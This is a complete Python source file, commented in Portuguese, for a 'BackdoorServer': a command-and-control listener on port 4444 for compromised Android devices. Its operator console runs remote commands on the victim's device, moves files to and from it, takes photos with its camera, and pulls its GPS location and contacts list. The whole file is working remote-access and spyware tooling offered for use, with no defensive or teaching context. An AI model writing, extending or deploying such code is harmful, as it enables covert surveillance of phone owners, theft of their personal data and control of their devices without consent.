#!/usr/bin/env python3

import socket
import json
import threading
import time
import base64
import os
from datetime import datetime

class BackdoorServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.session_id = 1
        self.running = False
        
    def start(self):
        """Inicia o servidor"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        self.running = True
        print(f"[*] Servidor escutando em {self.host}:{self.port}")
        
        # Thread para aceitar conexões
        threading.Thread(target=self.accept_connections, daemon=True).start()
        
        # Thread para interface de comando
        threading.Thread(target=self.command_interface, daemon=True).start()
        
        # Manter o servidor rodando
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Para o servidor"""
        self.running = False
        for session_id, client in list(self.sessions.items()):
            client['socket'].close()
        self.server.close()
        print("\n[*] Servidor parado")
    
    def accept_connections(self):
        """Aceita novas conexões de clientes"""
        while self.running:
            try:
                client_socket, addr = self.server.accept()
                session_id = self.session_id
                self.session_id += 1
                
                # Recebe informações iniciais do cliente
                try:
                    initial_data = client_socket.recv(4096).decode().strip()
                    client_info = json.loads(initial_data)
                except:
                    client_info = {"error": "Não foi possível obter informações"}
                
                # Armazena a sessão
                self.sessions[session_id] = {
                    'socket': client_socket,
                    'address': addr,
                    'info': client_info,
                    'last_active': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                print(f"\n[+] Nova conexão - Sessão {session_id} de {addr[0]}:{addr[1]}")
                print(f"    Hostname: {client_info.get('hostname', 'Desconhecido')}")
                print(f"    Usuário: {client_info.get('user', 'Desconhecido')}")
                print(f"    Dispositivo: {client_info.get('device', 'Desconhecido')}")
                print(f"    Android: {client_info.get('android_version', 'Desconhecido')}")
                
            except Exception as e:
                if self.running:
                    print(f"[!] Erro ao aceitar conexão: {e}")
                continue
    
    def command_interface(self):
        """Interface de comando para interagir com as sessões"""
        time.sleep(1)  # Dar tempo para o cabeçalho aparecer
        while self.running:
            try:
                print("\nSessões ativas:")
                for session_id, session in self.sessions.items():
                    print(f"  {session_id}: {session['address'][0]} - {session['info'].get('hostname', '?')} (última atividade: {session['last_active']})")
                
                cmd = input("\nbackdoor> ").strip().lower()
                
                if cmd == "exit":
                    self.stop()
                    break
                elif cmd == "help":
                    self.show_help()
                elif cmd == "clear":
                    os.system('clear' if os.name == 'posix' else 'cls')
                elif cmd == "list":
                    continue  # A lista já é mostrada no loop
                elif cmd.startswith("interact "):
                    self.interact_session(cmd[9:])
                elif cmd.startswith("cmd "):
                    parts = cmd.split(" ", 2)
                    if len(parts) == 3:
                        self.send_command(parts[1], parts[2])
                elif cmd.startswith("download "):
                    parts = cmd.split(" ", 2)
                    if len(parts) == 3:
                        self.download_file(parts[1], parts[2])
                elif cmd.startswith("upload "):
                    parts = cmd.split(" ", 2)
                    if len(parts) == 3:
                        self.upload_file(parts[1], parts[2])
                elif cmd.startswith("photo "):
                    self.take_photo(cmd[6:])
                elif cmd.startswith("location "):
                    self.get_location(cmd[9:])
                elif cmd.startswith("contacts "):
                    self.get_contacts(cmd[9:])
                elif cmd == "":
                    continue
                else:
                    print("Comando não reconhecido. Digite 'help' para ajuda.")
                
            except Exception as e:
                print(f"[!] Erro na interface de comando: {e}")
    
    def show_help(self):
        """Mostra ajuda dos comandos"""
        print("\nComandos disponíveis:")
        print("  list                  - Lista sessões ativas")
        print("  interact <session_id> - Interage com uma sessão específica")
        print("  cmd <session_id> <command> - Executa comando remoto")
        print("  download <session_id> <remote_path> - Baixa arquivo do alvo")
        print("  upload <session_id> <local_path> - Envia arquivo para o alvo")
        print("  photo <session_id>    - Tira foto com a câmera do dispositivo")
        print("  location <session_id> - Obtém localização GPS do dispositivo")
        print("  contacts <session_id>  - Lista contatos do dispositivo")
        print("  clear                 - Limpa a tela")
        print("  exit                  - Encerra o servidor")
    
    def interact_session(self, session_id_str):
        """Modo interativo com uma sessão específica"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            print(f"\n[*] Interagindo com sessão {session_id} ({session['address'][0]})")
            print("[*] Digite 'exit' para voltar ao menu principal\n")
            
            while True:
                try:
                    cmd = input(f"backdoor({session_id})> ").strip()
                    
                    if cmd == "exit":
                        break
                    elif cmd == "help":
                        print("\nComandos no modo interativo:")
                        print("  cmd <command>     - Executa comando no dispositivo")
                        print("  download <path>    - Baixa arquivo do dispositivo")
                        print("  upload <local> <remote> - Envia arquivo para o dispositivo")
                        print("  photo              - Tira foto com a câmera")
                        print("  location           - Obtém localização GPS")
                        print("  contacts           - Lista contatos")
                        print("  info               - Mostra informações do dispositivo")
                        print("  exit               - Volta ao menu principal")
                    elif cmd == "info":
                        self.print_session_info(session)
                    elif cmd.startswith("cmd "):
                        command = cmd[4:]
                        response = self.send_command_to_session(session, f"cmd:{command}")
                        print(response)
                    elif cmd.startswith("download "):
                        remote_path = cmd[9:]
                        self.handle_download(session, remote_path)
                    elif cmd.startswith("upload "):
                        parts = cmd.split(" ", 2)
                        if len(parts) == 3:
                            self.handle_upload(session, parts[1], parts[2])
                        else:
                            print("[!] Uso: upload <local_path> <remote_path>")
                    elif cmd == "photo":
                        self.handle_take_photo(session)
                    elif cmd == "location":
                        self.handle_get_location(session)
                    elif cmd == "contacts":
                        self.handle_get_contacts(session)
                    else:
                        print("[!] Comando não reconhecido. Digite 'help' para ajuda.")
                        
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] Erro durante interação: {e}")
        
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def print_session_info(self, session):
        """Mostra informações da sessão"""
        print("\nInformações do dispositivo:")
        for key, value in session['info'].items():
            print(f"  {key}: {value}")
        print(f"  Endereço: {session['address'][0]}:{session['address'][1]}")
        print(f"  Última atividade: {session['last_active']}")
    
    def send_command_to_session(self, session, command):
        """Envia comando para uma sessão específica"""
        try:
            session['socket'].send(command.encode())
            response = session['socket'].recv(65536).decode().strip()
            session['last_active'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            try:
                return json.loads(response)
            except:
                return response
        except Exception as e:
            return f"[!] Erro ao enviar comando: {e}"
    
    def send_command(self, session_id_str, command):
        """Envia comando para uma sessão"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            response = self.send_command_to_session(session, f"cmd:{command}")
            print(json.dumps(response, indent=2))
            
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def handle_download(self, session, remote_path):
        """Lida com download de arquivo"""
        try:
            print(f"[*] Solicitando download de {remote_path}")
            response = self.send_command_to_session(session, f"download:{remote_path}")
            
            if isinstance(response, dict) and response.get('status') == 'success':
                filename = response.get('filename', 'downloaded_file')
                content = base64.b64decode(response['content'])
                
                # Salva o arquivo localmente
                local_path = os.path.join("downloads", filename)
                os.makedirs("downloads", exist_ok=True)
                
                # Evita sobrescrever arquivos existentes
                counter = 1
                base_name, ext = os.path.splitext(local_path)
                while os.path.exists(local_path):
                    local_path = f"{base_name}_{counter}{ext}"
                    counter += 1
                
                with open(local_path, 'wb') as f:
                    f.write(content)
                
                print(f"[+] Arquivo salvo como {local_path} ({len(content)} bytes)")
            else:
                print("[!] Falha no download:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro durante download: {e}")
    
    def handle_upload(self, session, local_path, remote_path):
        """Lida com upload de arquivo"""
        try:
            if not os.path.exists(local_path):
                print("[!] Arquivo local não encontrado")
                return
                
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()
            
            print(f"[*] Enviando {local_path} para {remote_path}")
            response = self.send_command_to_session(
                session, 
                f"upload:{remote_path}:{content}"
            )
            
            if isinstance(response, dict) and response.get('status') == 'success':
                print("[+] Upload concluído:", response.get('message', ''))
            else:
                print("[!] Falha no upload:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro durante upload: {e}")
    
    def handle_take_photo(self, session):
        """Lida com solicitação de foto"""
        try:
            print("[*] Solicitando foto da câmera...")
            response = self.send_command_to_session(session, "photo")
            
            if isinstance(response, dict) and response.get('status') == 'success':
                filename = response.get('filename', 'photo.jpg')
                content = base64.b64decode(response['content'])
                
                # Salva a foto localmente
                local_path = os.path.join("downloads", filename)
                os.makedirs("downloads", exist_ok=True)
                
                # Evita sobrescrever fotos existentes
                counter = 1
                base_name, ext = os.path.splitext(local_path)
                while os.path.exists(local_path):
                    local_path = f"{base_name}_{counter}{ext}"
                    counter += 1
                
                with open(local_path, 'wb') as f:
                    f.write(content)
                
                print(f"[+] Foto salva como {local_path} ({len(content)} bytes)")
            else:
                print("[!] Falha ao obter foto:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro ao obter foto: {e}")
    
    def handle_get_location(self, session):
        """Lida com solicitação de localização"""
        try:
            print("[*] Solicitando localização GPS...")
            response = self.send_command_to_session(session, "location")
            
            if isinstance(response, dict) and response.get('status') == 'success':
                print("[+] Dados de localização:")
                try:
                    location_data = json.loads(response['data'])
                    for key, value in location_data.items():
                        print(f"  {key}: {value}")
                except:
                    print(response['data'])
            else:
                print("[!] Falha ao obter localização:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro ao obter localização: {e}")
    
    def handle_get_contacts(self, session):
        """Lida com solicitação de contatos"""
        try:
            print("[*] Solicitando lista de contatos...")
            response = self.send_command_to_session(session, "contacts")
            
            if isinstance(response, dict) and response.get('status') == 'success':
                print("[+] Lista de contatos:")
                try:
                    contacts = json.loads(response['data'])
                    for contact in contacts:
                        print(f"\nNome: {contact.get('name', 'Sem nome')}")
                        if 'number' in contact:
                            numbers = contact['number'] if isinstance(contact['number'], list) else [contact['number']]
                            for num in numbers:
                                print(f"  Número: {num}")
                except:
                    print(response['data'])
            else:
                print("[!] Falha ao obter contatos:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro ao obter contatos: {e}")
    
    def download_file(self, session_id_str, remote_path):
        """Comando para download de arquivo"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            self.handle_download(session, remote_path)
            
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def upload_file(self, session_id_str, local_path):
        """Comando para upload de arquivo"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            remote_path = os.path.basename(local_path)
            session = self.sessions[session_id]
            self.handle_upload(session, local_path, remote_path)
            
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def take_photo(self, session_id_str):
        """Comando para tirar foto"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            self.handle_take_photo(session)
            
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def get_location(self, session_id_str):
        """Comando para obter localização"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            self.handle_get_location(session)
            
        except ValueError:
            print("[!] ID de sessão inválido")
    
    def get_contacts(self, session_id_str):
        """Comando para obter contatos"""
        try:
            session_id = int(session_id_str)
            if session_id not in self.sessions:
                print(f"[!] Sessão {session_id} não encontrada")
                return
                
            session = self.sessions[session_id]
            self.handle_get_contacts(session)
            
        except ValueError:
            print("[!] ID de sessão inválido")

if __name__ == "__main__":
    server = BackdoorServer()
    server.start()
